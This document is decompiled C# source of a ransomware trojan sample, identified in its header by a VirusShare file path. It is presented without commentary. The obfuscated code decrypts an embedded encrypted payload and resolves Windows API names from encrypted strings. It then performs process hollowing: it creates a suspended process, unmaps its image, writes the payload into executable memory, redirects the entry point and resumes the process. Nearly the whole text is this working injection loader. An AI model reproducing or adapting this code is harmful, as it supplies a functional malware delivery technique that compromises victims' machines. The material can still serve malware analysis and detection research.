// Decompiled with JetBrains decompiler
// Type: aÚº
// Assembly: rgdy3gff, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 7E8A8C74-CADB-4DDD-9169-21C415556F24
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00011-msil\Trojan-Ransom.Win32.Blocker.jfuo-17f73145a3783f8ebcf8d2902b361b310dddcea8a18fd5544d217d7aefd63ed1.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Resources;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

[StandardModule]
internal sealed class aÚº
{
  public static byte[] pÑÖÒÆ(byte[] wp, long Õ)
  {
    byte[] numArray = new byte[15]
    {
      (byte) 206,
      (byte) 97,
      (byte) 91,
      (byte) 156,
      (byte) 253,
      (byte) 88,
      (byte) 186,
      (byte) 129,
      (byte) 136,
      (byte) 174,
      (byte) 225,
      (byte) 47,
      (byte) 201,
      (byte) 58,
      (byte) 39
    };
    using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
    {
      Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(numArray, numArray, 1);
      rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes((int) Math.Round((double) rijndaelManaged.KeySize / 8.0));
      rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes((int) Math.Round((double) rijndaelManaged.BlockSize / 8.0));
      return rijndaelManaged.CreateDecryptor().TransformFinalBlock(wp, 0, wp.Length);
    }
  }

  public static string ÄÈ(string c, uint vÉc6Ñ) => Encoding.UTF8.GetString(aÚº.pÑÖÒÆ(Convert.FromBase64String(c), 1512379173L));

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr GetModuleHandleA([MarshalAs(UnmanagedType.VBByRefStr)] ref string ÿfa);

  [DllImport("kernel32", CharSet = CharSet.Ansi, SetLastError = true)]
  public static extern IntPtr GetProcAddress(IntPtr ÿfa, [MarshalAs(UnmanagedType.VBByRefStr)] ref string yÅz);

  public static yÅz ÿfa<yÅz>(DateTime ÑÆÄqd, ulong Ëad9, Decimal Ã, string d, DateTime º) => (yÅz) Marshal.GetDelegateForFunctionPointer(aÚº.GetProcAddress(aÚº.GetModuleHandleA(ref d.Split(Convert.ToChar(58))[0]), ref d.Split(Convert.ToChar(58))[1]), typeof (yÅz));

  public static void wdvaÎ(byte[] wdvaÎ, sbyte Ëpg)
  {
    int num1 = 0;
    do
    {
      ++num1;
    }
    while (num1 <= 100);
    short num2 = 2302;
    string ÇÞËtÐ1 = Assembly.GetEntryAssembly().Location;
    byte num3 = 0;
    do
    {
      int num4 = (int) num3;
      while (num4 <= 30 && num4 != 25)
        ++num4;
      ++num3;
    }
    while (num3 <= (byte) 20);
    if (Directory.Exists(Conversions.ToString(Environment.SystemDirectory[0]) + aÚº.ÄÈ("nSkChCds2qv3TVaa6W3qPprkNZ8kAcKbT04ykaHg8ME=", 1183608974U)))
    {
      foreach (string directory in Directory.GetDirectories(Conversions.ToString(Environment.SystemDirectory[0]) + aÚº.ÄÈ("V22hRDX1p+lyBMIFCpHZboZcX3ZXbkweDbIdf8RWRb6qrYz61Tj5y3a3fElEJ4tZ", 848136793U)))
      {
        if (directory.Contains(aÚº.ÄÈ("gQQtFCUUJj99bL0F2VJ/Sg==", 0U)))
        {
          ÇÞËtÐ1 = directory + aÚº.ÄÈ("DY4GqdoQG+fKKrO61WfQnA==", 1157344585U);
          Guid.NewGuid();
          break;
        }
        ++num2;
      }
    }
    byte[] numArray1 = new byte[6]
    {
      (byte) 0,
      (byte) 1,
      (byte) 2,
      (byte) 3,
      (byte) 4,
      (byte) 5
    };
    int[] numArray2 = new int[8]
    {
      1,
      16,
      2,
      32,
      4,
      64,
      4,
      64
    };
    bool flag1 = false;
    int int32 = BitConverter.ToInt32(wdvaÎ, 60);
    int int16 = (int) BitConverter.ToInt16(wdvaÎ, int32 + 6);
    IntPtr u8_1 = new IntPtr(BitConverter.ToInt32(wdvaÎ, int32 + 84));
    IntPtr[] ahØÁÁ = new IntPtr[4];
    IntPtr num5;
    if (!aÚº.ÿfa<aÚº.ÀÈu>(DateTime.Now, 659650509UL, 1100982880M, aÚº.ÄÈ("3I2Yc0dpNW5CpQaL6oaS3NY7tcF5PcfymMURcBP4py0=", 1533651088U), DateTime.Now)((string) null, ÇÞËtÐ1, num5, num5, false, 4, num5, (string) null, new byte[0], ahØÁÁ))
      return;
    try
    {
      flag1 = true;
      uint[] ÇÞËtÐ2 = new uint[179];
      ÇÞËtÐ2[0] = 65538U;
      if (aÚº.ÿfa<aÚº.tc>(DateTime.Now, 1372037236UL, 846407122M, aÚº.ÄÈ("vk/tP5MEBWceNgESQgaUDeQhhwWrrqQLxtDuA3nqtaM=", 536983014U), DateTime.Now)(ahØÁÁ[1], ÇÞËtÐ2))
      {
        IntPtr ÀºÒ25k1;
        IntPtr Í_;
        if (aÚº.ÿfa<aÚº.ÓÄ>(DateTime.Now, 1205618221UL, 2146044429M, aÚº.ÄÈ("zz+9O3j8VO/oj/nGPmXy5G7611umaSrGGKiuBYMt22k=", 1974491982U), DateTime.Now)(ahØÁÁ[0], new IntPtr((long) ÇÞËtÐ2[41] + 8L), ref ÀºÒ25k1, new IntPtr(4), ref Í_))
        {
          if (aÚº.ÿfa<aÚº.ÂµÍyÿi>(DateTime.Now, 407992492UL, 1220478605M, aÚº.ÄÈ("RC7hxpFv8fGn/U5MvYgL0lHXFNvxRT9FNnmfdZR3+98=", 948867298U), DateTime.Now)(ahØÁÁ[0], ÀºÒ25k1) == 0U)
          {
            aÚº.Õx9gßË õx9gßË = aÚº.ÿfa<aÚº.Õx9gßË>(DateTime.MinValue, 943919211UL, 129903580M, aÚº.ÄÈ("PMhR2MFAXJcqBHo07Yj44sNDhV/CQxmMZmYbtwTjpHI=", 1711954922U), DateTime.MinValue);
            IntPtr wdvaÎ1 = ahØÁÁ[0];
            IntPtr num6 = new IntPtr(BitConverter.ToInt32(wdvaÎ, int32 + 52));
            IntPtr ÇÞËtÐ3 = num6;
            IntPtr num7 = new IntPtr(BitConverter.ToInt32(wdvaÎ, int32 + 80));
            IntPtr ÀºÒ25k2 = num7;
            IntPtr ÇÞËtÐ4 = õx9gßË(wdvaÎ1, ÇÞËtÐ3, ÀºÒ25k2, 12288, 64);
            aÚº.gm gm1 = aÚº.ÿfa<aÚº.gm>(DateTime.Now, 0UL, 1875832596M, aÚº.ÄÈ("EF1mChrpjHPu+CXvJCOWbXe59YIXiWelqeP4U8znKCo=", 1510882009U), DateTime.Now);
            numArray1 = (byte[]) null;
            bool flag2 = gm1(ahØÁÁ[0], ÇÞËtÐ4, wdvaÎ, u8_1, ref Í_);
            int[] dst1 = new int[10];
            int num8 = int16 - 1;
            for (int index = 0; index <= num8; ++index)
            {
              dst1[0] = 15;
              dst1[5] = 223 + dst1[0];
              Buffer.BlockCopy((Array) wdvaÎ, int32 + 248 + index * 40, (Array) dst1, 0, 40);
              byte[] dst2 = new byte[dst1[4] - 1 + 1];
              flag1 = false;
              dst1.Length.ToString();
              Buffer.BlockCopy((Array) wdvaÎ, dst1[5], (Array) dst2, 0, dst2.Length);
              aÚº.gm gm2 = gm1;
              IntPtr wdvaÎ2 = ahØÁÁ[0];
              num7 = new IntPtr(ÇÞËtÐ4.ToInt32() + dst1[3]);
              IntPtr ÇÞËtÐ5 = num7;
              byte[] ÀºÒ25k3 = dst2;
              num6 = new IntPtr(dst2.Length);
              IntPtr u8_2 = num6;
              ref IntPtr local = ref Í_;
              flag2 = gm2(wdvaÎ2, ÇÞËtÐ5, ÀºÒ25k3, u8_2, ref local);
            }
            aÚº.gm gm3 = gm1;
            IntPtr wdvaÎ3 = ahØÁÁ[0];
            num7 = new IntPtr((long) ÇÞËtÐ2[41] + 8L);
            IntPtr ÇÞËtÐ6 = num7;
            byte[] bytes = BitConverter.GetBytes(ÇÞËtÐ4.ToInt32());
            num6 = new IntPtr(4);
            IntPtr u8_3 = num6;
            ref IntPtr local1 = ref Í_;
            flag2 = gm3(wdvaÎ3, ÇÞËtÐ6, bytes, u8_3, ref local1);
            ÇÞËtÐ2[44] = (uint) (ÇÞËtÐ4.ToInt32() + BitConverter.ToInt32(wdvaÎ, int32 + 40));
            int num9 = aÚº.ÿfa<aÚº.tc>(DateTime.Now, 854883155UL, -191390358M, aÚº.ÄÈ("5w484C2btFFK5vWMmbMj7so9mo3l2VChk7uR0lz1/J4=", 313612901U), DateTime.MinValue)(ahØÁÁ[1], ÇÞËtÐ2) ? 1 : 0;
            flag1 = true;
            int num10 = aÚº.ÿfa<aÚº.ÈÃk4Æ>(DateTime.MinValue, 2104026588UL, -411370650M, aÚº.ÄÈ("uAVU0vbCmI/v+N5/8/xWyfxJt+oDoMPnA8rxg27vUXY=", 1300306431U), DateTime.Now)(ahØÁÁ[1]);
            return;
          }
        }
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    Process.GetProcessById(ahØÁÁ[2].ToInt32()).Kill();
  }

  [STAThread]
  public static void Main() => aÚº.wdvaÎ(aÚº.pÑÖÒÆ((byte[]) new ResourceManager("zoxliahl", Assembly.GetExecutingAssembly()).GetObject(aÚº.ÄÈ("HKzM8nNXETytZYpyiCRElg==", 836092004U)), 1575746318L), (sbyte) -93);

  public delegate bool ÀÈu(
    string wdvaÎ,
    string ÇÞËtÐ,
    IntPtr ÀºÒ25k,
    IntPtr u8,
    bool Í_,
    int Íjej,
    IntPtr p,
    string saÂ,
    byte[] gÓ81rÐ,
    IntPtr[] ahØÁÁ);

  public delegate bool tc(IntPtr wdvaÎ, uint[] ÇÞËtÐ);

  public delegate bool ÓÄ(
    IntPtr wdvaÎ,
    IntPtr ÇÞËtÐ,
    ref IntPtr ÀºÒ25k,
    IntPtr u8,
    ref IntPtr Í_);

  public delegate uint ÂµÍyÿi(IntPtr wdvaÎ, IntPtr ÇÞËtÐ);

  public delegate IntPtr Õx9gßË(IntPtr wdvaÎ, IntPtr ÇÞËtÐ, IntPtr ÀºÒ25k, int u8, int Í_);

  public delegate bool gm(IntPtr wdvaÎ, IntPtr ÇÞËtÐ, byte[] ÀºÒ25k, IntPtr u8, ref IntPtr Í_);

  public delegate int ÈÃk4Æ(IntPtr wdvaÎ);
}
